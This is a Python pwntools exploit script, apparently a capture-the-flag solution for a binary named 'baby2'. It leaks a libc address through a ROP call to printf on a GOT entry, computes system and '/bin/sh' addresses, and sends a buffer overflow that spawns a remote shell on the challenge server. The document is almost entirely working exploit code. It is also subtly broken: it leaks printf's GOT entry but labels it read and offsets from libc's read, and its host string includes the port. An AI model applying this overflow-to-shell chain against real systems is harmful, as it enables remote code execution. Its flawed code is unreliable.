from pwn import *
context(log_level='debug',arch='amd64')
elf = ELF('./baby2')
libc = ELF('./libc.so.6')
main = elf.symbols['main']
read_got = elf.symbols['got.printf']
format_string = next(elf.search('%s'))
system_offset = libc.symbols['read'] - libc.symbols['system']
sh_offset = libc.symbols['read'] - next(libc.search('/bin/sh'))
r = ROP(elf)
r.printf(format_string,read_got)
r.main()
#p=elf.process()											# Run the main again to buffer overflow again
p = remote('baby-01.pwn.beer 10002',10002)
p.sendline('a'*24+str(r))
p.recvuntil("\n")
read_address = p.recvuntil("!\n")[:-2]
read_address = u64(read_address + b"\x00\x00")
system_address = read_address - system_offset
sh_address = read_address - sh_offset
elf.symbols['system'] = system_address				# Set the system address
r = ROP(elf)
r.system(sh_address)								# system("/bin/sh")
p.sendline('a'*24+str(r))							# Send the payload again
p.interactive()